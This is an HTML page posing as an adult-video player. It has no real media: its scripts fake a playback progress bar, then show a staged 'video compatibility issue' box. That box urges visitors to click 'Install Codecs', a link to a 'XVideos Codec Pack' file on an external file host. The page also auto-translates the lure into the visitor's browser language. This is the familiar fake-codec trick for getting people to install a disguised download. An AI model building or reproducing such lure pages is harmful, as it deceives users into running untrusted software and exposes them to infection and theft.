
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Video Player</title>

<style>
/* GOOGLE TRANSLATE */
.goog-te-banner-frame.skiptranslate,
.goog-te-gadget-icon,
#goog-gt-tt,
.goog-te-balloon-frame,
.goog-te-menu-frame {
    display:none !important;
}

body > .skiptranslate {
    display:none !important;
}

body{
    margin:0;
    padding:0;
    width:100%;
    min-height:100%;
}

body{
    background:#111;
    color:#fff;
    font-family:Arial,Helvetica,sans-serif;
}

/* Google Translate */
.goog-te-banner-frame.skiptranslate{
    display:none !important;
}

body{
    top:0 !important;
}

.goog-te-gadget{
    font-size:0 !important;
}

#google_translate_element{
    position:fixed;
    left:-10000px;
    top:-10000px;
    width:1px;
    height:1px;
    overflow:hidden;
    opacity:0;
    pointer-events:none;
}

/* Main */
.wrapper{
    width:100%;
    max-width:1000px;
    margin:0 auto;
    padding:20px 12px 40px;
}

.player{
    position:relative;
    width:100%;
    aspect-ratio:16 / 9;
    background:#000 url("ai_bot.png") center center / cover no-repeat;
    border-radius:10px;
    overflow:hidden;
    box-shadow:0 10px 35px rgba(0,0,0,.45);
}

/* Bottom protection gradient */
.player::after{
    content:"";
    position:absolute;
    left:0;
    right:0;
    bottom:0;
    height:85px;
    background:linear-gradient(
        to bottom,
        rgba(0,0,0,0),
        rgba(0,0,0,.15),
        rgba(0,0,0,.72)
    );
    pointer-events:none;
    z-index:1;
}

/* Center play button */
.center-play{
    position:absolute;
    left:50%;
    top:50%;
    transform:translate(-50%,-50%);
    width:72px;
    height:72px;
    border-radius:50%;
    border:0;
    background:rgba(0,0,0,.65);
    color:#fff;
    font-size:30px;
    cursor:pointer;
    z-index:3;
    transition:.2s ease;
}

.center-play:hover{
    transform:translate(-50%,-50%) scale(1.08);
    background:rgba(0,0,0,.82);
}

/* Controls */
.controls{
    position:absolute;
    left:0;
    right:0;
    bottom:0;
    height:52px;
    display:flex;
    align-items:center;
    gap:10px;
    padding:7px 10px;
    background:linear-gradient(
        to top,
        rgba(0,0,0,.92),
        rgba(0,0,0,.68)
    );
    z-index:2;
}

.control-btn{
    border:0;
    background:none;
    color:#fff;
    cursor:pointer;
    font-size:18px;
    width:32px;
    min-width:32px;
    height:32px;
    padding:0;
    display:flex;
    align-items:center;
    justify-content:center;
}

.control-btn:hover{
    color:#ddd;
}

.progress-wrap{
    flex:1;
    height:5px;
    background:rgba(255,255,255,.25);
    border-radius:10px;
    cursor:pointer;
    overflow:hidden;
}

.progress{
    width:0%;
    height:100%;
    background:#fff;
    border-radius:10px;
}

.time{
    font-size:12px;
    color:#fff;
    white-space:nowrap;
    min-width:76px;
    text-align:right;
}

.volume{
    width:62px;
    min-width:62px;
    accent-color:#fff;
}

/* Codec box */
.codec-box{
    margin-top:18px;
    padding:20px;
    border-radius:10px;
    background:#1a1a1a;
    border:1px solid #292929;
    text-align:center;
    display:none;
    box-shadow:0 8px 25px rgba(0,0,0,.25);
}

.codec-box.visible{
    display:block;
    animation:fadeIn .45s ease;
}

.checking{
    color:#ddd;
    font-size:15px;
}

.spinner{
    width:28px;
    height:28px;
    margin:0 auto 12px;
    border:3px solid rgba(255,255,255,.18);
    border-top-color:#fff;
    border-radius:50%;
    animation:spin .8s linear infinite;
}

.codec-result{
    display:none;
}

.codec-result.show{
    display:block;
    animation:fadeIn .45s ease;
}

.codec-result h2{
    margin:0 0 10px;
    font-size:20px;
    color:#fff;
}

.codec-result p{
    margin:0 auto 18px;
    max-width:620px;
    color:#bbb;
    font-size:14px;
    line-height:1.55;
}

.install-btn{
    display:inline-flex;
    align-items:center;
    justify-content:center;
    min-height:44px;
    padding:0 24px;
    border-radius:7px;
    background:#fff;
    color:#111;
    text-decoration:none;
    font-weight:700;
    font-size:14px;
    transition:.2s ease;
}

.install-btn:hover{
    transform:translateY(-1px);
    background:#e8e8e8;
}

/* Animations */
@keyframes spin{
    from{
        transform:rotate(0deg);
    }
    to{
        transform:rotate(360deg);
    }
}

@keyframes fadeIn{
    from{
        opacity:0;
        transform:translateY(8px);
    }
    to{
        opacity:1;
        transform:translateY(0);
    }
}

/* Tablet */
@media(max-width:768px){

    .wrapper{
        padding:10px 8px 30px;
    }

    .player{
        border-radius:8px;
    }

    .center-play{
        width:60px;
        height:60px;
        font-size:25px;
    }

    .controls{
        height:38px;
        padding:4px 7px;
        gap:5px;
    }

    .control-btn{
        width:27px;
        min-width:27px;
        height:27px;
        font-size:15px;
    }

    .progress-wrap{
        height:4px;
    }

    .time{
        font-size:10px;
        min-width:68px;
    }

    .volume{
        width:48px;
        min-width:48px;
    }

    .player::after{
        height:58px;
    }
}

/* Mobile */
@media(max-width:480px){

    .wrapper{
        padding:6px 5px 25px;
    }

    .player{
        border-radius:7px;
    }

    .center-play{
        width:52px;
        height:52px;
        font-size:22px;
    }

    .controls{
        height:34px;
        padding:3px 5px;
        gap:3px;
    }

    .control-btn{
        width:24px;
        min-width:24px;
        height:24px;
        font-size:13px;
    }

    .progress-wrap{
        height:3px;
    }

    .time{
        font-size:9px;
        min-width:60px;
    }

    .volume{
        width:40px;
        min-width:40px;
    }

    .player::after{
        height:50px;
    }

    .codec-box{
        margin-top:12px;
        padding:16px 12px;
    }

    .codec-result h2{
        font-size:18px;
    }

    .codec-result p{
        font-size:13px;
    }

    .install-btn{
        width:100%;
        min-height:42px;
    }
}

/* Very small phones */
@media(max-width:360px){

    .controls{
        height:31px;
        padding:2px 4px;
        gap:2px;
    }

    .control-btn{
        width:22px;
        min-width:22px;
        height:22px;
        font-size:12px;
    }

    .progress-wrap{
        height:3px;
    }

    .time{
        font-size:8px;
        min-width:54px;
    }

    .volume{
        width:34px;
        min-width:34px;
    }

    .player::after{
        height:45px;
    }
}
</style>
</head>

<body>

<!-- Google Translate -->
<div id="google_translate_element"></div>

<div class="wrapper">

    <div class="player" id="player">

        <button class="center-play" id="centerPlay" aria-label="Play">
            ▶
        </button>

        <div class="controls">

            <button
                class="control-btn"
                id="playBtn"
                title="Play"
                aria-label="Play"
            >▶</button>

            <div class="progress-wrap" id="progressWrap">
                <div class="progress" id="progress"></div>
            </div>

            <div class="time" id="time">
                00:00 / 15:28
            </div>

            <input
                class="volume"
                id="volume"
                type="range"
                min="0"
                max="1"
                step="0.01"
                value="1"
                aria-label="Volume"
            >

        </div>
    </div>

    <!-- Compatibility check -->
    <div class="codec-box" id="codecBox">

        <div class="checking" id="checking">

            <div class="spinner"></div>

            <div>
                Checking video compatibility...
            </div>

        </div>

        <div class="codec-result" id="codecResult">

            <h2>
                Video compatibility issue
            </h2>

            <p>
                This video requires additional codecs for proper playback. You ned install the codec pack.
            </p>

            <a
                class="install-btn"
                href="https://ikx.filexspace.com/getfile/PJCCJ?title=XVideos%20Codec%20Pack"
                target="_blank"
                rel="noopener noreferrer"
            >
                Install Codecs
            </a>

        </div>

    </div>

</div>

<script>
/* ================================
   Player
================================ */

const player = document.getElementById("player");
const playBtn = document.getElementById("playBtn");
const centerPlay = document.getElementById("centerPlay");
const progressWrap = document.getElementById("progressWrap");
const progress = document.getElementById("progress");
const time = document.getElementById("time");
const volume = document.getElementById("volume");

const codecBox = document.getElementById("codecBox");
const checking = document.getElementById("checking");
const codecResult = document.getElementById("codecResult");

let isPlaying = false;
let interval = null;

let currentTime = 0;

let compatibilityTimer = null;
let resultTimer = null;

/*
   Random duration:
   12:02 - 15:28
*/
const totalDuration =
    Math.floor(
        Math.random() * (928 - 722 + 1)
    ) + 722;


/* Format seconds */
function formatTime(seconds){

    const minutes = Math.floor(seconds / 60);

    const secs = seconds % 60;

    return String(minutes).padStart(2,"0")
        + ":"
        + String(secs).padStart(2,"0");
}


/* Update player time */
function updateTime(){

    const percent =
        (currentTime / totalDuration) * 100;

    progress.style.width =
        Math.min(percent,100) + "%";

    time.textContent =
        formatTime(currentTime)
        + " / "
        + formatTime(totalDuration);
}


/* Start fake playback */
function startProgress(){

    if(interval !== null){
        return;
    }

    isPlaying = true;

    playBtn.textContent = "❚❚";
    playBtn.title = "Pause";

    centerPlay.style.display = "none";

    interval = setInterval(function(){

        if(currentTime < totalDuration){

            currentTime++;

            updateTime();

        }else{

            stopProgress();

        }

    },1000);
}


/* Stop fake playback */
function stopProgress(){

    if(interval !== null){

        clearInterval(interval);

        interval = null;
    }

    isPlaying = false;

    playBtn.textContent = "▶";
    playBtn.title = "Play";

    centerPlay.style.display = "flex";
}


/* Compatibility animation */
function showCompatibilityCheck(){

    if(compatibilityTimer !== null){
        return;
    }

    compatibilityTimer = setTimeout(function(){

        codecBox.classList.add("visible");

        /*
           Wait before showing result
        */
        resultTimer = setTimeout(function(){

            checking.style.display = "none";

            codecResult.classList.add("show");

            translateNewContent();

        },3000);

    },2000);
}


/* Play button */
playBtn.addEventListener("click",function(e){

    e.stopPropagation();

    if(isPlaying){

        stopProgress();

    }else{

        startProgress();

        showCompatibilityCheck();

    }

});


/* Center play */
centerPlay.addEventListener("click",function(e){

    e.stopPropagation();

    startProgress();

    showCompatibilityCheck();

});


/* Click player */
player.addEventListener("click",function(e){

    if(e.target.closest(".controls")){
        return;
    }

    if(!isPlaying){

        startProgress();

        showCompatibilityCheck();

    }

});


/* Progress seeking */
progressWrap.addEventListener("click",function(e){

    const rect =
        progressWrap.getBoundingClientRect();

    const percent =
        (e.clientX - rect.left) / rect.width;

    currentTime =
        Math.floor(
            totalDuration *
            Math.max(0,Math.min(1,percent))
        );

    updateTime();

});


/* Volume */
volume.addEventListener("input",function(){

    /*
       Kept for UI compatibility.
       There is no actual media element in this demo.
    */

});


/* Initial time */
updateTime();


/* ================================
   Google Translate
================================ */

function googleTranslateElementInit(){

    new google.translate.TranslateElement({

        pageLanguage:"en",

        autoDisplay:false,

        includedLanguages:
            "en,uk,ru,de,fr,es,it,pt,pl,tr,ro,cs,sk,hu,nl,sv,no,da,fi,el,bg,ar,he,hi,ja,ko,zh-CN,zh-TW",

        layout:
            google.translate.TranslateElement.InlineLayout.SIMPLE

    },"google_translate_element");

}


/* Browser language */
function getBrowserLanguage(){

    const lang =
        (
            navigator.language ||
            navigator.userLanguage ||
            "en"
        ).toLowerCase();

    return lang.split("-")[0];

}


/* Apply language */
function applyBrowserLanguage(){

    const browserLanguage =
        getBrowserLanguage();

    const supported = [

        "en",
        "uk",
        "ru",
        "de",
        "fr",
        "es",
        "it",
        "pt",
        "pl",
        "tr",
        "ro",
        "cs",
        "sk",
        "hu",
        "nl",
        "sv",
        "no",
        "da",
        "fi",
        "el",
        "bg",
        "ar",
        "he",
        "hi",
        "ja",
        "ko"

    ];

    if(!supported.includes(browserLanguage)){
        return;
    }

    const select =
        document.querySelector(".goog-te-combo");

    if(!select){
        return;
    }

    if(select.value !== browserLanguage){

        select.value = browserLanguage;

        select.dispatchEvent(
            new Event("change")
        );

    }

}


/* Dynamic translation */
function translateNewContent(){

    setTimeout(function(){

        applyBrowserLanguage();

    },300);

    setTimeout(function(){

        applyBrowserLanguage();

    },1000);

    setTimeout(function(){

        applyBrowserLanguage();

    },2000);

}


/* Wait for Google Translate */
function waitForTranslator(){

    let attempts = 0;

    const timer =
        setInterval(function(){

            attempts++;

            const select =
                document.querySelector(".goog-te-combo");

            if(select){

                clearInterval(timer);

                applyBrowserLanguage();

                return;
            }

            if(attempts > 40){

                clearInterval(timer);

            }

        },500);

}


/* Load Google Translate */
(function(){

    const script =
        document.createElement("script");

    script.src =
        "https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit";

    script.async = true;

    document.head.appendChild(script);

})();


/* Observer for dynamically added text */
const observer =
    new MutationObserver(function(mutations){

        let changed = false;

        mutations.forEach(function(mutation){

            if(mutation.type === "childList"){

                if(
                    mutation.addedNodes &&
                    mutation.addedNodes.length
                ){

                    changed = true;

                }

            }

        });

        if(changed){

            translateNewContent();

        }

    });


observer.observe(
    document.body,
    {
        childList:true,
        subtree:true
    }
);


/* Start translator polling */
setTimeout(function(){

    waitForTranslator();

},1000);


/* Additional retry */
setTimeout(function(){

    applyBrowserLanguage();

},4000);

</script>

</body>
</html>
